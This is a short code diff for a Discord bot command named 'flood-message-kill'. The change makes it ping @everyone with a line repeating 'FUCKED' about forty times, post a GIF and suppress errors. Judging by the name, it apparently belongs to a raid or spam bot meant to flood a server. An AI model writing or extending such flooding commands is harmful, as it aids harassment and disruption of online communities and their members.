@@ -2,7 +2,7 @@ module.exports = ({
 name: "flood-message-kill",
 type: "awaitedCommand",
 code: `
-@everyone FUCKED $image[https://imagizer.imageshack.com/img923/6253/PnbTER.gif]
+@everyone FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED FUCKED  $image[https://www.elergonomista.com/wp-content/uploads/2019/05/G53.gif]
 $suppressErrors
 ` 
 })
